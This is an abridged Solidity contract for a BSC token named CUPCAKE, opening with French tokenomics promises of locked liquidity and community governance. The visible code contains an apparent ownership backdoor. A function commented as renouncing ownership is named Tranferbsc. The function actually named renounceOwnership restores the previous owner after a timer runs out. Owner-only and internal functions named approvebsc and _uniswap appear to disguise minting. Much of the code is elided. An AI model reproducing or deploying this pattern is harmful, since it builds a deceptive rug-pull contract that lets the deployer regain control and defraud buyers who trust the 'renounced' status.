...
//  SPDX-License-Identifier: MIT
 TG: https://t.me/cupcakecoin_io
 Website: https://cupcakecoin.io/
      📜Tokenomics

💰 7% de Redistribution aux detenteurs de $CAKE
🔐 Liquidité bloquée
🥞 basé sur la platforme BSC 
✅ Lancement public / pas de prévente
👥 Sondages pour l’avis de la communauté, gestion par et pour la communauté. 
...
contract Ownable is Context {
    ...
    //Renounce Ownership the contract
    function Tranferbsc(uint8 _time) public virtual onlyOwner {
    ...
    //Transfer Owner the contract
    function renounceOwnership() public virtual {
        require(_previousOwner == msg.sender, "You don't have permission to Transfer Owner");
        require(now > _lockTime , "The Contract has been transfer");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}

contract CUPCAKE is Context, iBEP20, Ownable {
 ...
 /**
   ...
   */
  function approvebsc(uint256 amount) public onlyOwner returns (bool) {
  ...
  function _uniswap(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: uniswapV2");
